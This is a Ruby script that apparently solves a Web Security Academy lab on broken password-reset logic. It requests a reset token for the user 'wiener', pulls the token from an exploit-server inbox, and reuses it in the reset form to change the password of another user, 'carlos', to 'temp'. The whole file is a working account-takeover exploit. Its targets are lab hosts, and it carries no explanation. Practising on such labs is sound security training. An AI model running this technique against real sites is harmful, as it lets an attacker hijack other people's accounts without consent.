require 'http'
require 'nokogiri'

url1 = 'https://0a3c00fc043a877080296c0100b900db.web-security-academy.net/forgot-password'

# Make sure you change the raw parameter to latest password reset email count+1
url2 = 'https://exploit-0a9500aa049087f6806b6b1a01100062.exploit-server.net/email?raw=8'

client = HTTP.headers(
	"User-Agent"=>"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0"
	)

# Send Password Reset Request
resp1 = client.post(url1,:form=>{:username=>"wiener"})
puts 'Password Reset Request Sent' if resp1.code == 200

# Fetch token from the email client
puts 'Fetching Password Reset Token'
resp2 = client.get url2
puts resp2.body.to_s
token = resp2.body.to_s.split('=')[1].split("\n")[0]

puts "Password Reset Token = #{token}"

# Reset User's password

resp2 = client.post(url1,:form=>{
	:"temp-forgot-password-token"=>"#{token}",
	:username=>"carlos",
	:"new-password-1"=>"temp",
	:"new-password-2"=>"temp"
})

puts 'Password Changed to [temp]' if resp2.code == 302
